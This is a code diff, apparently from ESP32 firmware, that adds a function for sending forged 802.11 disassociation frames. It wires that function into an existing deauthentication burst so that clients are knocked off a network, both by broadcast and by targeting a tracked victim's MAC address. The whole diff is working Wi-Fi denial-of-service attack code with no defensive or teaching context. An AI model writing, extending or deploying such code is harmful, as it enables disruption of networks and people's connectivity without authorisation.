@@ -116,13 +116,35 @@ inline void sendDeauthFrame(const uint8_t* dst, const uint8_t* bssid, uint8_t re
   if (err != ESP_OK) g_txErrors++;
 }
 
+inline void sendDisassocFrame(const uint8_t* dst, const uint8_t* bssid, uint8_t reason = 0x08) {
+  uint8_t frame[26] = {
+    0xA0, 0x00, 0x00, 0x00,
+    0,0,0,0,0,0,
+    0,0,0,0,0,0,
+    0,0,0,0,0,0,
+    0x00, 0x00
+  };
+  memcpy(&frame[4],  dst,   6);
+  memcpy(&frame[10], bssid, 6);
+  memcpy(&frame[16], bssid, 6);
+  frame[24] = reason;
+  frame[25] = 0x00;
+  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
+  g_packetsSent++;
+  if (err != ESP_OK) g_txErrors++;
+}
+
 inline void sendDeauthBurst(const uint8_t* bssid) {
   static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   static const uint8_t reasons[] = { 0x07, 0x01, 0x07, 0x03, 0x06, 0x08 };
   for (int i = 0; i < cfg_deauth_burst; i++) {
     uint8_t reason = (cfg_deauth_reason > 0) ? (uint8_t)cfg_deauth_reason : reasons[i % 6];
     sendDeauthFrame(bcast, bssid, reason);
-    if (g_victimFound) sendDeauthFrame(g_victimMAC, bssid, reason);
+    sendDisassocFrame(bcast, bssid, reason);
+    if (g_victimFound) {
+      sendDeauthFrame(g_victimMAC, bssid, reason);
+      sendDisassocFrame(g_victimMAC, bssid, reason);
+    }
   }
 }
 
